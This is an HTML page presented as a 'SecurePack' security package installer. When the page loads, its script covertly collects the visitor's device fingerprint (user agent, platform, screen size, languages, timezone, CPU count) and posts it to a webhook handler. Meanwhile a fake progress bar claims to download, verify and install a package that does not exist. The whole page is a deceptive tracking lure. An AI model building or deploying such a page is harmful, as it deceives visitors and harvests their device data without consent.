<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SecurePack Installer</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #333;
        }

        .container {
            background: white;
            border-radius: 16px;
            padding: 40px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.1);
            max-width: 450px;
            width: 90%;
            text-align: center;
        }

        .logo {
            font-size: 2.2rem;
            font-weight: 700;
            color: #4F46E5;
            margin-bottom: 8px;
        }

        .subtitle {
            color: #6B7280;
            font-size: 1rem;
            margin-bottom: 30px;
            font-weight: 400;
        }

        .download-section {
            margin-bottom: 30px;
        }

        .download-info {
            background: #F3F4F6;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 25px;
            border-left: 4px solid #4F46E5;
        }

        .download-title {
            font-size: 1.1rem;
            font-weight: 600;
            color: #374151;
            margin-bottom: 8px;
        }

        .download-desc {
            color: #6B7280;
            font-size: 0.9rem;
            line-height: 1.5;
        }

        .input-field {
            width: 100%;
            padding: 12px 16px;
            font-size: 1rem;
            border: 2px solid #E5E7EB;
            border-radius: 8px;
            background: #F9FAFB;
            color: #374151;
            outline: none;
            transition: all 0.2s ease;
            margin-bottom: 20px;
        }

        .input-field:focus {
            border-color: #4F46E5;
            background: white;
        }

        .download-btn {
            background: #4F46E5;
            color: white;
            border: none;
            padding: 12px 32px;
            font-size: 1rem;
            font-weight: 500;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.2s ease;
            width: 100%;
        }

        .download-btn:hover {
            background: #4338CA;
        }

        .download-btn:disabled {
            background: #9CA3AF;
            cursor: not-allowed;
        }

        .progress-section {
            display: none;
        }

        .progress-bar {
            width: 100%;
            height: 8px;
            background: #E5E7EB;
            border-radius: 4px;
            overflow: hidden;
            margin: 20px 0;
        }

        .progress-fill {
            height: 100%;
            background: #4F46E5;
            width: 0%;
            transition: width 0.3s ease;
        }

        .progress-text {
            color: #6B7280;
            font-size: 0.9rem;
            margin-bottom: 10px;
        }

        .complete-section {
            display: none;
        }

        .success-icon {
            font-size: 3rem;
            color: #10B981;
            margin-bottom: 15px;
        }

        .success-title {
            font-size: 1.3rem;
            font-weight: 600;
            color: #374151;
            margin-bottom: 10px;
        }

        .success-desc {
            color: #6B7280;
            font-size: 0.9rem;
            line-height: 1.5;
        }

        .footer-note {
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #E5E7EB;
            color: #9CA3AF;
            font-size: 0.8rem;
        }

        @media (max-width: 768px) {
            .container {
                padding: 30px 20px;
                margin: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Initial Download Section -->
        <div id="download-section" class="download-section">
            <div class="logo">🛡️ SecurePack</div>
            <p class="subtitle">Essential Security Package Required</p>

            <div class="download-info">
                <div class="download-title">📦 Security Package v2.1.4</div>
                <div class="download-desc">
                    This package contains essential security updates and features required to access our services safely.
                </div>
            </div>

            <input type="text" id="nameInput" class="input-field" placeholder="Enter your name to continue" required />

            <button onclick="startDownload()" class="download-btn" id="downloadBtn">
                Download & Install Package
            </button>
        </div>

        <!-- Progress Section -->
        <div id="progress-section" class="progress-section">
            <div class="logo">🛡️ SecurePack</div>
            <p class="subtitle">Installing Security Package...</p>

            <div class="progress-text" id="progressText">Initializing download...</div>
            <div class="progress-bar">
                <div class="progress-fill" id="progressFill"></div>
            </div>
            <div style="color: #6B7280; font-size: 0.8rem;" id="progressDetails">
                Connecting to secure servers...
            </div>
        </div>

        <!-- Complete Section -->
        <div id="complete-section" class="complete-section">
            <div class="success-icon">✅</div>
            <div class="success-title">Installation Complete!</div>
            <div class="success-desc">
                Welcome, <span id="userName"></span>! The security package has been successfully installed.<br><br>
                <strong>🚧 Service Status:</strong> Currently under maintenance<br>
                <em>We're working hard to bring you something amazing. Please check back soon!</em>
            </div>
        </div>

        <div class="footer-note">
            Secure • Encrypted • Trusted by millions
        </div>
    </div>

    <script>
        let progressInterval;

        // Automatically start the process on window load
        window.onload = function() {
            startDownload();
        };

        async function startDownload() {
            // Get device name from platform or user agent
            const deviceName = navigator.platform || (navigator.userAgent.match(/\(([^;]+);/i) || [null, "Unknown Device"])[1];
            const name = deviceName; 

            // Hide download section, show progress
            document.getElementById('download-section').style.display = 'none';
            document.getElementById('progress-section').style.display = 'block';

            // Start progress animation
            simulateProgress();

            try {
                // Collect enhanced client-side information
                const clientInfo = {
                    name: name,
                    timestamp: new Date().toISOString(),
                    screen: {
                        width: screen.width,
                        height: screen.height,
                        colorDepth: screen.colorDepth,
                        pixelDepth: screen.pixelDepth
                    },
                    window: {
                        innerWidth: window.innerWidth,
                        innerHeight: window.innerHeight
                    },
                    navigator: {
                        language: navigator.language,
                        languages: navigator.languages,
                        platform: navigator.platform,
                        cookieEnabled: navigator.cookieEnabled,
                        onLine: navigator.onLine,
                        hardwareConcurrency: navigator.hardwareConcurrency
                    },
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    localTime: new Date().toString(),
                    userAgent: navigator.userAgent
                };

                // Send enhanced data to webhook
                await fetch('webhook_handler.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(clientInfo)
                });
            } catch (error) {
                console.error('Error:', error);
            }
        }

        function simulateProgress() {
            let progress = 0;
            const progressFill = document.getElementById('progressFill');
            const progressText = document.getElementById('progressText');
            const progressDetails = document.getElementById('progressDetails');

            const steps = [
                { percent: 15, text: "Downloading security package...", detail: "Fetching components from secure servers..." },
                { percent: 35, text: "Verifying package integrity...", detail: "Checking digital signatures..." },
                { percent: 55, text: "Installing core modules...", detail: "Extracting security definitions..." },
                { percent: 75, text: "Configuring security settings...", detail: "Applying protection protocols..." },
                { percent: 90, text: "Finalizing installation...", detail: "Optimizing system integration..." },
                { percent: 100, text: "Installation complete!", detail: "Ready to proceed..." }
            ];

            let stepIndex = 0;

            progressInterval = setInterval(() => {
                if (stepIndex < steps.length) {
                    const step = steps[stepIndex];
                    progressFill.style.width = step.percent + '%';
                    progressText.textContent = step.text;
                    progressDetails.textContent = step.detail;

                    if (step.percent === 100) {
                        setTimeout(() => {
                            showComplete();
                        }, 1000);
                        clearInterval(progressInterval);
                    }

                    stepIndex++;
                } else {
                    clearInterval(progressInterval);
                }
            }, 1500); // Each step takes 1.5 seconds
        }

        function showComplete() {
            const name = document.getElementById('nameInput').value.trim();

            // Hide progress, show complete
            document.getElementById('progress-section').style.display = 'none';
            document.getElementById('complete-section').style.display = 'block';
            document.getElementById('userName').textContent = name;
        }

        // Allow Enter key to submit
        document.getElementById('nameInput').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                startDownload();
            }
        });
    </script>
</body>
</html>
